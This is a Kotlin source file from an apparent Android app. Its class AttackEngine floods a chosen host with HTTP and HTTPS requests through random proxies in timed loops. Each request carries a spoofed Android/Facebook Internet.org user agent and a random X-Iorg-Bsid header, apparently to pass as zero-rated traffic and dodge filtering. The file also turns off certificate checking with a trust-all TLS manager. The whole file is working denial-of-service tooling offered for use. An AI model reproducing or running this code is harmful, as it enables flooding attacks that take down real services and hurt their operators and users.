package com.alrufaaey.batapp

import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.InetSocketAddress
import java.net.Socket
import java.security.SecureRandom
import java.security.cert.X509Certificate
import java.util.UUID
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicLong
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import kotlin.random.Random

class AttackEngine(
    private val host: String,
    private val isHttps: Boolean,
    private val onRequestSent: (Long) -> Unit,
    private val onLog: (String) -> Unit
) {
    val running = AtomicBoolean(true)
    private val requestCounter = AtomicLong(0)

    private val specialChars = "@#$%&*-_+="
    
    // قائمة أجهزة Android عشوائية
    private val androidDevices = listOf(
        "SM-G998B", "SM-G996B", "SM-G990E", "SM-F926B", "SM-F711B",
        "SM-A525F", "SM-A325F", "SM-A125F", "SM-A225F", "SM-A725F",
        "SM-N986B", "SM-N985F", "SM-N976B", "SM-N975F", "SM-N971N",
        "Pixel 6", "Pixel 6 Pro", "Pixel 7", "Pixel 7 Pro", "Pixel 8",
        "M2101K6G", "M2012K11G", "M2007J3SY", "M2102J20SG", "M2104K10AC",
        "CPH2025", "CPH2069", "CPH2127", "CPH2173", "CPH2207"
    )
    
    // قائمة إصدارات Android
    private val androidVersions = listOf("11", "12", "13", "14", "15")
    
    // قائمة إصدارات Chrome
    private val chromeVersions = listOf("133.0.6943.49", "134.0.6998.39", "134.0.6998.88", "135.0.7049.39", "135.0.7049.95")

    private fun generateRandomDeviceName(): String {
        val device = androidDevices.random()
        val version = androidVersions.random()
        val build = "TP1A.${Random.nextInt(100, 999)}.${Random.nextInt(10, 99)}"
        return "$device Build/$build"
    }

    private fun generateRandomUserAgent(): String {
        val deviceName = generateRandomDeviceName()
        val chromeVer = chromeVersions.random()
        val fbVer = "${Random.nextInt(450, 500)}.0.0.0.${Random.nextInt(100, 999)}"
        
        return "Mozilla/5.0 (Linux; Android ${androidVersions.random()}; $deviceName; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/$chromeVer Mobile Safari/537.36 [FBAN/InternetOrgApp;FBAV/$fbVer;]"
    }

    private fun generateRandomId(): String {
        return UUID.randomUUID().toString()
    }

    private fun buildBlock(size: Int): String {
        val sb = StringBuilder(size)
        repeat(size) {
            val choice = Random.nextInt(1, 4)
            when (choice) {
                1 -> sb.append(('A'..'Z').random())
                2 -> sb.append(('a'..'z').random())
                else -> sb.append(('0'..'9').random())
            }
        }
        return sb.toString()
    }

    private fun generateRandomIp(): String {
        return "${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}.${Random.nextInt(1, 255)}"
    }

    private fun createSecureConnect(targetHost: String, userAgent: String, xIorgBsid: String): String {
        return buildString {
            append("CONNECT $targetHost:443 HTTP/1.1\r\n")
            append("Host: $targetHost:443\r\n")
            append("Proxy-Connection: keep-alive\r\n")
            append("User-Agent: $userAgent\r\n")
            append("X-Iorg-Bsid: $xIorgBsid\r\n")
            append("X-Iorg-Service-Id: null\r\n")
            append("\r\n")
        }
    }

    private fun createProxySocket(): Socket? {
        val proxyStr = AttackConfig.PROXIES.random()
        val parts = proxyStr.split(":")
        val pHost = parts[0]
        val pPort = parts[1].toInt()

        return try {
            val sock = Socket()
            sock.soTimeout = 10000
            sock.setOption(java.net.StandardSocketOptions.SO_KEEPALIVE, true)
            sock.setOption(java.net.StandardSocketOptions.TCP_NODELAY, true)
            sock.connect(InetSocketAddress(pHost, pPort), 10000)
            sock
        } catch (e: Exception) {
            null
        }
    }

    private fun getTrustAllSslContext(): SSLContext {
        val trustAllCerts = arrayOf<TrustManager>(object : X509TrustManager {
            override fun checkClientTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun checkServerTrusted(chain: Array<X509Certificate>, authType: String) {}
            override fun getAcceptedIssuers(): Array<X509Certificate> = arrayOf()
        })
        val sslContext = SSLContext.getInstance("TLS")
        sslContext.init(null, trustAllCerts, SecureRandom())
        return sslContext
    }

    fun runHttpsAttack() {
        var sock: Socket? = null
        try {
            sock = createProxySocket() ?: return
            val userAgent = generateRandomUserAgent()
            val xIorgBsid = generateRandomId()
            val connectRequest = createSecureConnect(host, userAgent, xIorgBsid)
            
            // تسجيل البايلود للعرض
            onLog("🔹 Payload Sent:\n$connectRequest")
            
            sock.getOutputStream().write(connectRequest.toByteArray())
            sock.getOutputStream().flush()

            val reader = BufferedReader(InputStreamReader(sock.getInputStream()))
            val firstLine = reader.readLine() ?: ""
            
            if (!firstLine.contains("200")) {
                onLog("❌ Proxy failed: $firstLine")
                return
            }

            val sslContext = getTrustAllSslContext()
            val sslSock = sslContext.socketFactory.createSocket(sock, host, 443, true)
            sslSock.soTimeout = 10000

            val startAttack = System.currentTimeMillis()
            val out = sslSock.getOutputStream()
            val input = sslSock.getInputStream()

            while (running.get() && System.currentTimeMillis() - startAttack < 60000) {
                // إنشاء بايلود جديد لكل طلب
                val newUserAgent = generateRandomUserAgent()
                val newXIorgBsid = generateRandomId()
                
                val path = "/" + buildBlock(Random.nextInt(5, 15))
                val request = buildString {
                    append("GET $path HTTP/1.1\r\n")
                    append("Host: $host\r\n")
                    append("User-Agent: $newUserAgent\r\n")
                    append("X-Iorg-Bsid: $newXIorgBsid\r\n")
                    append("X-Iorg-Service-Id: null\r\n")
                    append("Connection: keep-alive\r\n")
                    append("\r\n")
                }
                
                out.write(request.toByteArray())
                out.flush()
                
                val count = requestCounter.incrementAndGet()
                onRequestSent(count)

                // قراءة جزء من الاستجابة
                val buffer = ByteArray(1024)
                val read = input.read(buffer)
                if (read != -1) {
                    val resp = String(buffer, 0, if (read > 100) 100 else read).replace("\r\n", " ")
                    onLog("📱 Response [$count]: ${resp.take(60)}...")
                    onLog("   Device: ${newUserAgent.substringAfter("Android ").substringBefore(";")}")
                    onLog("   BSID: $newXIorgBsid")
                }

                Thread.sleep(Random.nextLong(50, 200))
            }
            sslSock.close()
        } catch (e: Exception) {
            onLog("❌ HTTPS Error: ${e.message}")
        } finally {
            try { sock?.close() } catch (e: Exception) {}
        }
    }

    fun runHttpAttack() {
        var sock: Socket? = null
        try {
            sock = createProxySocket() ?: return
            
            val startAttack = System.currentTimeMillis()
            val out = sock.getOutputStream()
            val input = sock.getInputStream()

            while (running.get() && System.currentTimeMillis() - startAttack < 60000) {
                // إنشاء قيم جديدة لكل طلب
                val userAgent = generateRandomUserAgent()
                val xIorgBsid = generateRandomId()
                
                val path = "/" + buildBlock(Random.nextInt(5, 15))
                val request = buildString {
                    append("GET http://$host$path HTTP/1.1\r\n")
                    append("Host: $host\r\n")
                    append("User-Agent: $userAgent\r\n")
                    append("X-Iorg-Bsid: $xIorgBsid\r\n")
                    append("X-Iorg-Service-Id: null\r\n")
                    append("Proxy-Connection: keep-alive\r\n")
                    append("\r\n")
                }
                
                // تسجيل البايلود
                onLog("🔹 HTTP Request:\n$request")
                
                out.write(request.toByteArray())
                out.flush()
                
                val count = requestCounter.incrementAndGet()
                onRequestSent(count)

                val buffer = ByteArray(1024)
                val read = input.read(buffer)
                if (read != -1) {
                    val resp = String(buffer, 0, if (read > 100) 100 else read).replace("\r\n", " ")
                    onLog("📱 Response [$count]: ${resp.take(60)}...")
                }

                Thread.sleep(Random.nextLong(50, 200))
            }
        } catch (e: Exception) {
            onLog("❌ HTTP Error: ${e.message}")
        } finally {
            try { sock?.close() } catch (e: Exception) {}
        }
    }

    fun stop() {
        running.set(false)
    }
}
